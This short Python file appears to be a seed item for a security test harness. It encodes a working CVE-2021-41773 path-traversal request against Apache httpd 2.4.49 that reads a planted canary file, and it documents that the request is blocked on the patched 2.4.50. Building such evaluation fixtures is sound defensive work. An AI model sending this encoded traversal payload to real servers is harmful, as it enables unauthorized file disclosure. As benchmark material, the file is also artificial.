#!/usr/bin/env python3
"""[GIVEN] CVE-2021-41773 seed exploit — single %2e-encoded path traversal.

Reads the defended resource (the planted canary at /canary.txt, one level below
the filesystem root, outside DocumentRoot) via the aliased /pub/ directory.

Contract: reaches the canary on V0 (httpd 2.4.49); BLOCKED on V1 (httpd 2.4.50),
because the CVE-2021-41773 fix in server/util.c ap_normalize_path (see patch.diff)
now collapses `.%2e/` segments. This is the seed the system-under-test is given.
"""
from __future__ import annotations

# Single-encoding: `.%2e` and `%2e%2e` decode to `..` in one pass.
# 4 dot-dot segments walk htdocs -> apache2 -> local -> usr -> / , then /canary.txt.
PATH = "/pub/.%2e/%2e%2e/%2e%2e/%2e%2e/canary.txt"


def candidate() -> dict:
    """The request candidate (candidate_schema.json shape) for this seed."""
    return {"probe_id": "cve-2021-41773-single-encoded", "method": "GET", "path": PATH}


if __name__ == "__main__":
    print(candidate()["path"])
